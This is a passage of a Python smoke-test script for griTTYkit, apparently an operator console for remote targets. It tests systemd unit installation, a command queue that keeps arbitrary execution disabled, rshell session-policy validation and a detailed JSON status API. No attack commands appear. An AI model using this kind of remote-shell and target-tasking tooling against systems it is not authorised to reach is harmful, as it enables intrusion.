                print(daemon_restart_stdout, file=sys.stderr)
                print(daemon_restart_stderr, file=sys.stderr)
                return 1
        finally:
            if daemon_restart_proc is not None and daemon_restart_proc.poll() is None:
                daemon_restart_proc.terminate()
                try:
                    daemon_restart_proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    daemon_restart_proc.kill()
                    daemon_restart_proc.communicate(timeout=5)
            if daemon_proc.poll() is None:
                daemon_proc.terminate()
                try:
                    daemon_proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    daemon_proc.kill()
                    daemon_proc.communicate(timeout=5)

        systemd_unit_dir = Path(tmp) / "systemd-user"
        systemd_unit_name = "grit-smoke.service"
        systemd_print = run(
            "scripts/grit-console",
            "--config", str(daemon_cfg),
            "--daemon-service", "file-service",
            "--systemd-user-action", "print",
            "--systemd-user-unit-name", systemd_unit_name,
        )
        if (systemd_print.returncode != 0 or
                "Description=griTTYkit Operator Daemon" not in systemd_print.stdout or
                "ExecStart=" not in systemd_print.stdout or
                "--daemon --daemon-service file-service" not in systemd_print.stdout or
                f"--config {daemon_cfg}" not in systemd_print.stdout):
            print("systemd user unit print did not describe daemon command", file=sys.stderr)
            print(systemd_print.stdout, file=sys.stderr)
            print(systemd_print.stderr, file=sys.stderr)
            return 1
        systemd_install = run(
            "scripts/grit-console",
            "--config", str(daemon_cfg),
            "--daemon-service", "file-service",
            "--systemd-user-action", "install",
            "--systemd-user-unit-name", systemd_unit_name,
            "--systemd-user-unit-dir", str(systemd_unit_dir),
        )
        unit_path = systemd_unit_dir / systemd_unit_name
        if (systemd_install.returncode != 0 or
                not unit_path.is_file() or
                "installed" not in systemd_install.stdout or
                "systemctl --user enable --now grit-smoke.service" not in systemd_install.stdout):
            print("systemd user unit install failed", file=sys.stderr)
            print(systemd_install.stdout, file=sys.stderr)
            print(systemd_install.stderr, file=sys.stderr)
            return 1
        unit_text = unit_path.read_text(encoding="utf-8")
        if ("WorkingDirectory=" not in unit_text or
                "Restart=on-failure" not in unit_text or
                "--daemon --daemon-service file-service" not in unit_text):
            print("installed systemd user unit missing daemon lifecycle fields", file=sys.stderr)
            print(unit_text, file=sys.stderr)
            return 1
        systemd_status = run(
            "scripts/grit-console",
            "--config", str(daemon_cfg),
            "--systemd-user-action", "status",
            "--systemd-user-unit-name", systemd_unit_name,
            "--systemd-user-dry-run",
        )
        if systemd_status.returncode != 0 or systemd_status.stdout.strip() != "systemctl --user status grit-smoke.service":
            print("systemd user status dry-run did not print systemctl command", file=sys.stderr)
            print(systemd_status.stdout, file=sys.stderr)
            print(systemd_status.stderr, file=sys.stderr)
            return 1
        systemd_workbench_action = run(
            "scripts/grit-console",
            "--config", str(daemon_cfg),
            "--run-workbench-action", "systemd-user-status",
            "--workbench-action-dry-run",
        )
        if (systemd_workbench_action.returncode != 0 or
                "workbench action: systemd-user-status" not in systemd_workbench_action.stdout or
                "command=scripts/grit-console --config" not in systemd_workbench_action.stdout or
                "--systemd-user-action status --systemd-user-dry-run" not in systemd_workbench_action.stdout or
                "systemctl --user status grit-operator.service" not in systemd_workbench_action.stdout or
                "headless_command=" in systemd_workbench_action.stdout):
            print("workbench action dry-run did not execute systemd user status preview", file=sys.stderr)
            print(systemd_workbench_action.stdout, file=sys.stderr)
            print(systemd_workbench_action.stderr, file=sys.stderr)
            return 1
        systemd_events = [
            json.loads(line)
            for line in (Path(tmp) / "operator-session" / "events.jsonl").read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if (not any(
                    event.get("event") == "systemd_user_unit_printed" and
                    "--systemd-user-action print" in event.get("details", {}).get("headless_command", "") and
                    "--daemon --daemon-service file-service" in event.get("details", {}).get("daemon_headless_command", "")
                    for event in systemd_events) or
                not any(
                    event.get("event") == "systemd_user_unit_installed" and
                    "--systemd-user-action install" in event.get("details", {}).get("headless_command", "") and
                    "systemctl --user daemon-reload" == event.get("details", {}).get("daemon_reload_command", "") and
                    "systemctl --user enable --now grit-smoke.service" == event.get("details", {}).get("enable_now_command", "")
                    for event in systemd_events) or
                not any(
                    event.get("event") == "systemd_user_action_dry_run" and
                    event.get("details", {}).get("action") == "status" and
                    "--systemd-user-action status" in event.get("details", {}).get("headless_command", "") and
                    "systemctl --user status grit-smoke.service" == event.get("details", {}).get("systemctl_command", "")
                    for event in systemd_events) or
                not any(
                    event.get("event") == "workbench_action_run_completed" and
                    event.get("details", {}).get("action_id") == "systemd-user-status" and
                    event.get("details", {}).get("dry_run") is True and
                    event.get("details", {}).get("returncode") == 0 and
                    "--run-workbench-action systemd-user-status --workbench-action-dry-run" in event.get("details", {}).get("headless_command", "")
                    for event in systemd_events)):
            print("systemd user-service events missing headless command metadata", file=sys.stderr)
            print(json.dumps(systemd_events[-12:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        workbench_jobs_file = queue_operator_dir / "workbench-jobs.json"
        workbench_job_log = queue_operator_dir / "package-job.log"
        workbench_job_log.write_text(
            "\n".join([f"line {idx}" for idx in range(1, 25)] + ["package complete"]) + "\n",
            encoding="utf-8",
        )
        workbench_jobs_file.write_text(json.dumps({
            "schema": 1,
            "jobs": [
                {
                    "id": "job-smoke",
                    "action_id": "package-artifact",
                    "command": "make package",
                    "state": "running",
                    "pid": 999999,
                    "managed_by": "workbench-smoke",
                    "started_at": "2026-05-28T00:00:00Z",
                    "log_path": str(workbench_job_log),
                }
            ],
        }) + "\n", encoding="utf-8")

        queue_status_doc = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--json-status",
        )
        queue_status_json = json.loads(queue_status_doc.stdout)
        expected_command_sha = hashlib.sha256("grit reality-test --json".encode("utf-8")).hexdigest()
        if (queue_status_json["command_queue"]["result_count"] != 1 or
                queue_status_json["command_queue"].get("result_output_exceeded_count") != 0 or
                queue_status_json["command_queue"].get("result_status_counts", {}).get("completed") != 1 or
                queue_status_json["command_queue"].get("result_exit_code_counts", {}).get("0") != 1 or
                queue_status_json["command_queue"].get("result_output_size_bucket_counts", {}).get("small") != 1 or
                queue_status_json.get("summary", {}).get("command_queue_result_status_counts", {}).get("completed") != 1 or
                queue_status_json.get("summary", {}).get("command_queue_result_exit_code_counts", {}).get("0") != 1 or
                queue_status_json.get("summary", {}).get("command_queue_result_output_size_bucket_counts", {}).get("small") != 1 or
                queue_status_json["command_queue"].get("latest_created_at") != command_after_result.get("created_at") or
                queue_status_json["command_queue"].get("latest_result_received_at") != command_after_result.get("result_received_at")):
            print("server json status missing command queue summary", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        status_queue = queue_status_json["command_queue"]
        if (status_queue.get("enabled") != "no" or
                status_queue.get("policy_valid") is not True or
                status_queue.get("policy_errors") != [] or
                status_queue.get("configured_for_polling") is not False or
                status_queue.get("arbitrary_policy_requested") is not False or
                status_queue.get("arbitrary_execution_allowed") is not False or
                status_queue.get("active_control_channel") is not False or
                status_queue.get("executes_commands") is not False):
            print("server json status missing command queue safety policy", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (status_queue.get("commands_by_id", {}).get(command_id, {}).get("status") != "result-received" or
                len(status_queue.get("commands_by_status", {}).get("result-received", [])) != 1 or
                status_queue.get("commands_by_id", {}).get(command_id, {}).get("command_sha256") != expected_command_sha or
                status_queue.get("commands_by_command_sha256", {}).get(expected_command_sha, [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_created_at", {}).get(command_after_result.get("created_at"), [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_result_received_at", {}).get(command_after_result.get("result_received_at"), [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_result_source_path", {}).get(str(result_json), [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_delivered_at", {}) != {} or
                status_queue.get("commands_by_result_status", {}).get("completed", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_result_exit_code", {}).get("0", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_result_output_exceeded", {}).get("no", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_result_output_size_bucket", {}).get("small", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_timeout_sec", {}).get("9", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_max_output_bytes", {}).get("1234", [{}])[0].get("id") != command_id or
                status_queue.get("commands_by_id", {}).get(command_id, {}).get("result_output_size_bucket") != "small" or
                queue_status_json.get("summary", {}).get("command_queue_timeout_sec_counts", {}).get("9") != 1 or
                queue_status_json.get("summary", {}).get("command_queue_max_output_bytes_counts", {}).get("1234") != 1 or
                "commands_by_command_sha256" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_created_at" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_delivered_at" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_result_received_at" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_result_source_path" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_timeout_sec" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_max_output_bytes" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "commands_by_result_output_size_bucket" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                status_queue.get("status_counts", {}).get("result-received") != 1):
            print("server json status missing command queue lookup indexes", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        invalid_queue_status_doc = run(
            "scripts/grit-console",
            "--config", str(invalid_queue_cfg),
            "--json-status",
        )
        invalid_queue_status = json.loads(invalid_queue_status_doc.stdout)
        invalid_status_queue = invalid_queue_status["command_queue"]
        invalid_queue_policy_record = (invalid_queue_status.get("command_queue_policy_records_by_id") or {}).get("command-queue") or {}
        invalid_policy_warnings = [
            item for item in invalid_queue_status.get("warnings", [])
            if item.get("type") == "invalid_command_queue_policy"
        ]
        if (invalid_status_queue.get("policy_valid") is not False or
                invalid_status_queue.get("configured_for_polling") is not False or
                invalid_status_queue.get("arbitrary_policy_requested") is not False or
                invalid_status_queue.get("arbitrary_execution_allowed") is not False or
                invalid_queue_policy_record.get("valid") is not False or
                invalid_queue_policy_record.get("allowed_commands") != "grit-only" or
                invalid_queue_policy_record.get("arbitrary_execution_allowed") is not False or
                invalid_queue_policy_record.get("active_control_channel") is not False or
                invalid_queue_status.get("command_queue_policy_records_by_valid", {}).get("False", [{}])[0].get("id") != "command-queue" or
                invalid_queue_status.get("summary", {}).get("command_queue_policy_record_count") != 1 or
                invalid_queue_status.get("summary", {}).get("command_queue_policy_valid") is not False or
                invalid_queue_status.get("summary", {}).get("command_queue_policy_error_count") != len(invalid_status_queue.get("policy_errors", [])) or
                invalid_queue_status.get("summary", {}).get("command_queue_configured_for_polling") is not False or
                invalid_queue_status.get("summary", {}).get("command_queue_active_control_channel") is not False or
                invalid_queue_status.get("summary", {}).get("command_queue_arbitrary_execution_allowed") is not False or
                "command_queue_policy_records_by_arbitrary_execution_allowed" not in ((invalid_queue_status.get("api_collections") or {}).get("command_queue_policy_records") or {}).get("indexes", []) or
                not invalid_policy_warnings or
                "disabled command queue must keep allowed commands policy none" not in invalid_policy_warnings[-1].get("policy_errors", [])):
            print("server json status marked invalid command queue policy usable", file=sys.stderr)
            print(invalid_queue_status_doc.stdout, file=sys.stderr)
            return 1
        invalid_queue_status_text = run(
            "scripts/grit-console",
            "--config", str(invalid_queue_cfg),
            "--status",
        )
        if ("command queue policy is invalid; target polling is not configured" not in invalid_queue_status_text.stdout or
                "disabled command queue must keep allowed commands policy none" not in invalid_queue_status_text.stdout):
            print("server text status missing invalid command queue policy warning", file=sys.stderr)
            print(invalid_queue_status_text.stdout, file=sys.stderr)
            return 1
        invalid_rshell_cfg = Path(tmp) / "server-config-invalid-rshell-policy.json"
        invalid_rshell_cfg.write_text(json.dumps({
            "operator_session_dir": str(queue_operator_dir),
            "GRIT_RSHELL_SESSION_POLICY": "bogus",
        }), encoding="utf-8")
        invalid_rshell_status_doc = run(
            "scripts/grit-console",
            "--config", str(invalid_rshell_cfg),
            "--json-status",
        )
        invalid_rshell_status = json.loads(invalid_rshell_status_doc.stdout)
        invalid_rshell_warnings = [
            item for item in invalid_rshell_status.get("warnings", [])
            if item.get("type") == "invalid_rshell_session_policy"
        ]
        invalid_rshell_record = (invalid_rshell_status.get("target_commands_by_service") or {}).get("rshell", [{}])[0]
        invalid_rshell_metadata = invalid_rshell_record.get("metadata") or {}
        invalid_rshell_policy_record = (invalid_rshell_status.get("rshell_session_policy_records_by_id") or {}).get("rshell") or {}
        if (invalid_rshell_metadata.get("session_policy") != "bogus" or
                invalid_rshell_metadata.get("session_policy_valid") is not False or
                "unsupported rshell session policy" not in invalid_rshell_metadata.get("session_policy_errors", []) or
                "unsupported rshell session policy" not in (invalid_rshell_metadata.get("session_policy_summary") or {}).get("errors", []) or
                invalid_rshell_policy_record.get("session_policy") != "bogus" or
                invalid_rshell_policy_record.get("session_policy_valid") is not False or
                "unsupported rshell session policy" not in invalid_rshell_policy_record.get("session_policy_errors", []) or
                invalid_rshell_status.get("rshell_session_policy_records_by_session_policy_valid", {}).get("False", [{}])[0].get("id") != "rshell" or
                invalid_rshell_status.get("summary", {}).get("rshell_session_policy_record_count") != 1 or
                invalid_rshell_status.get("summary", {}).get("GRIT_RSHELL_SESSION_POLICY") != "bogus" or
                invalid_rshell_status.get("summary", {}).get("rshell_session_policy_valid") is not False or
                invalid_rshell_status.get("summary", {}).get("rshell_session_policy_error_count") != 1 or
                not invalid_rshell_warnings or
                invalid_rshell_warnings[-1].get("session_policy") != "bogus" or
                "unsupported rshell session policy" not in invalid_rshell_warnings[-1].get("session_policy_errors", []) or
                invalid_rshell_status.get("summary", {}).get("warning_type_counts", {}).get("invalid_rshell_session_policy") != 1 or
                invalid_rshell_status.get("summary", {}).get("target_command_session_policy_valid_counts", {}).get("False") != 1 or
                invalid_rshell_status.get("summary", {}).get("target_command_session_policy_error_count") != 1 or
                "rshell_session_policy_records_by_retry_scope" not in ((invalid_rshell_status.get("api_collections") or {}).get("rshell_session_policy_records") or {}).get("indexes", []) or
                invalid_rshell_status.get("warnings_by_type", {}).get("invalid_rshell_session_policy", [{}])[-1].get("session_policy") != "bogus"):
            print("server json status missing invalid rshell session policy warning", file=sys.stderr)
            print(invalid_rshell_status_doc.stdout, file=sys.stderr)
            return 1
        invalid_rshell_status_text = run(
            "scripts/grit-console",
            "--config", str(invalid_rshell_cfg),
            "--status",
        )
        if ("rshell session policy is invalid: bogus" not in invalid_rshell_status_text.stdout or
                "unsupported rshell session policy" not in invalid_rshell_status_text.stdout):
            print("server text status missing invalid rshell session policy warning", file=sys.stderr)
            print(invalid_rshell_status_text.stdout, file=sys.stderr)
            return 1
        exceeded_queue_file = Path(tmp) / "operator-session" / "exceeded-command-queue.json"
        exceeded_queued = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(exceeded_queue_file),
            "--queue-command", "grit survey",
            "--queue-max-output", "10",
        )
        if exceeded_queued.returncode != 0:
            print("operator command queue exceeded-limit fixture failed to queue", file=sys.stderr)
            print(exceeded_queued.stdout, file=sys.stderr)
            print(exceeded_queued.stderr, file=sys.stderr)
            return 1
        exceeded_id = json.loads(exceeded_queue_file.read_text(encoding="utf-8"))["commands"][0]["id"]
        exceeded_result_json = Path(tmp) / "command-result-exceeded.json"
        exceeded_result_json.write_text(json.dumps({
            "schema": 1,
            "command_id": exceeded_id,
            "status": "completed",
            "exit_code": 0,
            "stdout_bytes": 8,
            "stderr_bytes": 7,
        }) + "\n", encoding="utf-8")
        exceeded_recorded = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(exceeded_queue_file),
            "--record-command-result", exceeded_id,
            "--result-json", str(exceeded_result_json),
        )
        if exceeded_recorded.returncode != 0:
            print("operator command queue exceeded-limit result failed to record", file=sys.stderr)
            print(exceeded_recorded.stdout, file=sys.stderr)
            print(exceeded_recorded.stderr, file=sys.stderr)
            return 1
        exceeded_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(exceeded_queue_file),
            "--json-command-queue",
        ).stdout)["command_queue"]
        exceeded_rec = exceeded_status["commands"][0]
        if (exceeded_status.get("result_output_exceeded_count") != 1 or
                exceeded_status.get("result_status_counts", {}).get("completed") != 1 or
                exceeded_status.get("result_exit_code_counts", {}).get("0") != 1 or
                exceeded_status.get("result_output_size_bucket_counts", {}).get("small") != 1 or
                exceeded_status.get("commands_by_result_output_size_bucket", {}).get("small", [{}])[0].get("id") != exceeded_rec.get("id") or
                exceeded_rec.get("result_output_bytes") != 15 or
                exceeded_rec.get("result_output_size_bucket") != "small" or
                exceeded_rec.get("result_output_limit_bytes") != 10 or
                exceeded_rec.get("result_output_exceeded_limit") is not True):
            print("operator command queue did not flag result output over limit", file=sys.stderr)
            print(json.dumps(exceeded_status, indent=2), file=sys.stderr)
            return 1

        arbitrary_queue_cfg = Path(tmp) / "server-config-arbitrary-command-queue.json"
        arbitrary_queue_cfg.write_text(json.dumps({
            "operator_session_dir": str(queue_operator_dir),
            "command_queue_file": str(queue_file),
            "GRIT_COMMAND_QUEUE_ENABLE": "yes",
            "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "no",
            "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "custom",
            "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "yes",
        }), encoding="utf-8")
        arbitrary_queue_doc = run(
            "scripts/grit-console",
            "--config", str(arbitrary_queue_cfg),
            "--json-command-queue",
        )
        arbitrary_queue = json.loads(arbitrary_queue_doc.stdout)["command_queue"]
        arbitrary_queue_summary = arbitrary_queue.get("policy_summary") or {}
        if (arbitrary_queue.get("policy_valid") is not True or
                arbitrary_queue.get("arbitrary_policy_requested") is not True or
                arbitrary_queue.get("arbitrary_execution_allowed") is not False or
                arbitrary_queue.get("execution_supported") is not False or
                arbitrary_queue.get("executes_commands") is not False or
                arbitrary_queue_summary.get("configured_for_polling") is not True or
                arbitrary_queue_summary.get("arbitrary_policy_requested") is not True or
                arbitrary_queue_summary.get("arbitrary_execution_allowed") is not False):
            print("server command queue treated arbitrary policy request as execution permission", file=sys.stderr)
            print(arbitrary_queue_doc.stdout, file=sys.stderr)
            return 1
        if "summary" not in queue_status_json or "warnings" not in queue_status_json:
            print("server json status missing top-level summary/warnings", file=sys.stderr)
            return 1
        paths = queue_status_json.get("paths") or {}
        if (not queue_status_json.get("generated_at") or
                paths.get("state_file") != queue_status_json.get("state_file") or
                paths.get("staged_files") != queue_status_json.get("staged_files") or
                paths.get("command_queue_file") != str(queue_file) or
                paths.get("workbench_jobs_file") != str(workbench_jobs_file) or
                not paths.get("event_log") or
                not paths.get("operator_session_dir") or
                paths.get("tls_cert") != queue_status_json.get("tls_cert") or
                paths.get("tls_key") != queue_status_json.get("tls_key") or
                paths.get("tls_cert") != str(cert_path) or
                paths.get("tls_key") != str(key_path)):
            print("server json status missing stable generated_at/paths API fields", file=sys.stderr)
            return 1
        path_status = queue_status_json.get("path_status") or {}
        path_status_records = queue_status_json.get("path_status_records") or []
        path_status_by_name = queue_status_json.get("path_status_by_name") or {}
        path_status_by_path = queue_status_json.get("path_status_by_path") or {}
        path_status_by_kind = queue_status_json.get("path_status_by_expected_kind") or {}
        path_status_by_exists = queue_status_json.get("path_status_by_exists") or {}
        path_status_by_parent_exists = queue_status_json.get("path_status_by_parent_exists") or {}
        path_status_by_writable = queue_status_json.get("path_status_by_writable") or {}
        path_status_by_kind_mismatch = queue_status_json.get("path_status_by_expected_kind_mismatch") or {}
        state_path_status = path_status.get("state_file") or {}
        staged_path_status = path_status.get("staged_files") or {}
        command_queue_path_status = path_status.get("command_queue_file") or {}
        session_path_status = path_status.get("session_root") or {}
        server_state = queue_status_json.get("server_state") or {}
        staged_files_state = queue_status_json.get("staged_files_state") or {}
        command_queue_state = queue_status_json.get("command_queue_state") or {}
        service_manager_state = (queue_status_json.get("service_manager_state_records_by_id") or {}).get("service-manager") or {}
        operator_network_state = (queue_status_json.get("operator_network_state_records_by_id") or {}).get("operator-network") or {}
        if (set(paths) - set(path_status) or
                state_path_status.get("path") != queue_status_json.get("state_file") or
                state_path_status.get("expected_kind") != "file" or
                state_path_status.get("expected_kind_matches") is not True or
                state_path_status.get("expected_kind_mismatch") is not False or
                state_path_status.get("parent_exists") is not True or
                state_path_status.get("writable") is not True or
                session_path_status.get("expected_kind") != "dir" or
                session_path_status.get("expected_kind_matches") is not True or
                session_path_status.get("expected_kind_mismatch") is not False or
                queue_status_json["summary"].get("path_status_count") != len(paths) or
                queue_status_json["summary"].get("path_parent_missing_count") != 0 or
                queue_status_json["summary"].get("path_kind_mismatch_count") != 0):
            print("server json status missing operator path health records", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (len(path_status_records) != len(paths) or
                path_status_by_name.get("state_file", {}).get("path") != queue_status_json.get("state_file") or
                path_status_by_path.get(str(queue_file), [{}])[0].get("name") != "command_queue_file" or
                not path_status_by_kind.get("dir") or
                len(path_status_by_kind.get("file", [])) < 1 or
                len(path_status_by_exists.get("yes", [])) < 1 or
                path_status_by_parent_exists.get("no") != [] or
                len(path_status_by_writable.get("yes", [])) < 1 or
                path_status_by_kind_mismatch.get("yes") != []):
            print("server json status missing normalized operator path records/indexes", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        browser_paths = queue_status_json.get("browser_paths") or []
        browser_summary = queue_status_json.get("browser_path_summary") or {}
        browser_by_kind = queue_status_json.get("browser_paths_by_kind") or {}
        browser_by_path = queue_status_json.get("browser_paths_by_path") or {}
        browser_by_kind_source = queue_status_json.get("browser_paths_by_kind_source_id") or {}
        browser_by_exists = queue_status_json.get("browser_paths_by_exists") or {}
        browser_by_writable = queue_status_json.get("browser_paths_by_writable") or {}
        browser_by_kind_mismatch = queue_status_json.get("browser_paths_by_expected_kind_mismatch") or {}
        if (browser_summary.get("total_count") != len(browser_paths) or
                queue_status_json["summary"].get("browser_path_count") != len(browser_paths) or
                queue_status_json["summary"].get("browser_path_kind_counts", {}).get("server-state") != 1 or
                queue_status_json["summary"].get("browser_path_exists_kind_counts", {}).get("command-queue-ledger") != 1 or
                queue_status_json["summary"].get("browser_path_exists_kind_counts", {}).get("workbench-jobs-ledger") != 1 or
                queue_status_json["summary"].get("browser_path_missing_kind_counts", {}).get("staged-ledger") != 1 or
                queue_status_json["summary"].get("browser_path_kind_mismatch_count") != 0 or
                queue_status_json["summary"].get("browser_path_kind_mismatch_counts") != {} or
                not browser_by_kind.get("operator-dir") or
                not browser_by_kind.get("server-state") or
                not browser_by_kind.get("command-queue-ledger") or
                browser_by_kind["operator-dir"][0].get("expected_kind_matches") is not True or
                browser_by_kind["server-state"][0].get("expected_kind_mismatch") is not False or
                not browser_by_exists.get("yes") or
                not browser_by_writable.get("yes") or
                browser_by_kind_mismatch.get("yes") != [] or
                browser_by_kind_mismatch.get("no", [{}])[0].get("kind") not in ("operator-dir", "server-state") or
                browser_by_path.get(str(queue_file), [{}])[0].get("kind") != "command-queue-ledger" or
                browser_by_kind_source.get("command-queue-ledger:command_queue_file", [{}])[0].get("path") != str(queue_file) or
                browser_summary.get("exists_count", 0) < 1):
            print("server json status missing normalized browser path records", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        api_collections = queue_status_json.get("api_collections") or {}
        api = queue_status_json.get("api") or {}
        api_resources = queue_status_json.get("api_resources") or []
        api_resources_by_name = queue_status_json.get("api_resources_by_name") or {}
        api_resources_by_records_key = queue_status_json.get("api_resources_by_records_key") or {}
        api_resources_by_summary_key = queue_status_json.get("api_resources_by_summary_key") or {}
        api_resources_by_primary_key = queue_status_json.get("api_resources_by_primary_key") or {}
        api_resources_by_warning_indexes = queue_status_json.get("api_resources_by_has_warning_indexes") or {}
        if (api.get("schema") != 1 or
                api.get("status_command") != "scripts/grit-console --api-status" or
                api.get("json_status_command") != "scripts/grit-console --json-status" or
                api.get("event_limit") != 12 or
                api.get("resource_count") != len(api_resources) or
                api.get("resources_key") != "api_resources" or
                api.get("collections_key") != "api_collections"):
            print("server json status missing future frontend API catalog metadata", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        for collection_name, expected_count, expected_index in (
                ("services", len(queue_status_json.get("services") or []), "services_by_has_error"),
                ("service_workflow_actions", len(queue_status_json.get("service_workflow_actions") or []), "service_workflow_actions_by_service"),
                ("probe_workflow_actions", len(queue_status_json.get("probe_workflow_actions") or []), "probe_workflow_actions_by_route_kind"),
                ("service_manager_state_records", len(queue_status_json.get("service_manager_state_records") or []), "service_manager_state_records_by_shutdown_requested"),
                ("ports", len(queue_status_json.get("ports") or []), "ports_by_number"),
                ("path_status_records", len(path_status_records), "path_status_by_name"),
                ("server_state_records", len(queue_status_json.get("server_state_records") or []), "server_state_records_by_valid"),
                ("operator_network_records", len(queue_status_json.get("operator_network_records") or []), "operator_network_records_by_selected"),
                ("operator_network_state_records", len(queue_status_json.get("operator_network_state_records") or []), "operator_network_state_records_by_selected_ip"),
                ("browser_paths", len(browser_paths), "browser_paths_by_expected_kind_mismatch"),
                ("warnings", len(queue_status_json.get("warnings") or []), "warnings_by_type"),
                ("target_registry_state_records", len(queue_status_json.get("target_registry_state_records") or []), "target_registry_state_records_by_has_targets"),
                ("target_filter_records", len(queue_status_json.get("target_filter_records") or []), "target_filter_records_by_active"),
                ("target_attribution_records", len(queue_status_json.get("target_attribution_records") or []), "target_attribution_records_by_scope"),
                ("target_command_state_records", len(queue_status_json.get("target_command_state_records") or []), "target_command_state_records_by_safe_explicit_target_action_boundary"),
                ("target_workflow_actions", len(queue_status_json.get("target_workflow_actions") or []), "target_workflow_actions_by_target_id"),
                ("bridge_profile_workflow_actions", len(queue_status_json.get("bridge_profile_workflow_actions") or []), "bridge_profile_workflow_actions_by_bridge_profile"),
                ("rshell_session_policy_records", len(queue_status_json.get("rshell_session_policy_records") or []), "rshell_session_policy_records_by_session_policy_valid"),
                ("staged_records", len(queue_status_json.get("staged_records") or []), "staged_by_fetch_command"),
                ("staged_file_workflow_actions", len(queue_status_json.get("staged_file_workflow_actions") or []), "staged_file_workflow_actions_by_request_name"),
                ("file_service_workflow_actions", len(queue_status_json.get("file_service_workflow_actions") or []), "file_service_workflow_actions_by_action_id"),
                ("staged_files_state_records", len(queue_status_json.get("staged_files_state_records") or []), "staged_files_state_records_by_valid"),
                ("command_copy_records", len(queue_status_json.get("command_copy_records") or []), "command_copy_records_by_has_command"),
                ("command_copy_state_records", len(queue_status_json.get("command_copy_state_records") or []), "command_copy_state_records_by_empty_or_missing"),
                ("command_queue_state_records", len(queue_status_json.get("command_queue_state_records") or []), "command_queue_state_records_by_valid"),
                ("command_queue_commands", len((queue_status_json.get("command_queue") or {}).get("commands") or []), "commands_by_queue_policy_execution_mode"),
                ("command_queue_workflow_actions", len(queue_status_json.get("command_queue_workflow_actions") or []), "command_queue_workflow_actions_by_action_id"),
                ("command_queue_policy_records", len(queue_status_json.get("command_queue_policy_records") or []), "command_queue_policy_records_by_valid"),
                ("command_queue_modes", len(queue_status_json.get("command_queue_mode_records") or []), "command_queue_modes_by_result_upload_supported"),
                ("release_state_records", len(queue_status_json.get("release_state_records") or []), "release_state_records_by_detection_source"),
                ("release_artifact_workflow_actions", len(queue_status_json.get("release_artifact_workflow_actions") or []), "release_artifact_workflow_actions_by_selector_kind"),
                ("operator_console_workflows", len(queue_status_json.get("operator_console_workflows") or []), "operator_console_workflows_by_group"),
                ("workbench_actions", len(queue_status_json.get("workbench_actions") or []), "workbench_actions_by_id"),
                ("operator_daemon_workflow_actions", len(queue_status_json.get("operator_daemon_workflow_actions") or []), "operator_daemon_workflow_actions_by_workflow"),
                ("workbench_config_fields", len(queue_status_json.get("workbench_config_fields") or []), "workbench_config_fields_by_key"),
                ("workbench_jobs_state_records", len(queue_status_json.get("workbench_jobs_state_records") or []), "workbench_jobs_state_records_by_valid"),
                ("workbench_jobs", len(queue_status_json.get("workbench_jobs") or []), "workbench_jobs_by_id"),
                ("session_root_state_records", len(queue_status_json.get("session_root_state_records") or []), "session_root_state_records_by_exists"),
                ("sessions", len(queue_status_json.get("sessions") or []), "sessions_by_has_uploads"),
                ("events", len(queue_status_json.get("events") or []), "events_by_id"),
                ("event_log_state_records", len(queue_status_json.get("event_log_state_records") or []), "event_log_state_records_by_valid"),
        ):
            collection = api_collections.get(collection_name) or {}
            if (collection.get("count") != expected_count or
                    collection.get("name") != collection_name or
                    expected_index not in (collection.get("indexes") or []) or
                    not collection.get("summary_key") or
                    collection.get("count_summary_key") != collection.get("summary_key") or
                    (collection_name in ("services", "ports", "path_status_records", "browser_paths") and
                     collection.get("has_warning_indexes") is not True)):
                print(f"server json status missing api collection metadata for {collection_name}", file=sys.stderr)
                print(queue_status_doc.stdout, file=sys.stderr)
                return 1
        if (len(api_resources) != len(api_collections) or
                api_resources_by_name.get("services", {}).get("records_key") != "services" or
                api_resources_by_name.get("services", {}).get("collection_key") != "api_collections.services" or
                api_resources_by_name.get("services", {}).get("count") != len(queue_status_json.get("services") or []) or
                api_resources_by_name.get("services", {}).get("summary_key") != "service_count" or
                api_resources_by_name.get("services", {}).get("has_warning_indexes") is not True or
                "services_by_warning_type" not in (api_resources_by_name.get("services", {}).get("warning_indexes") or []) or
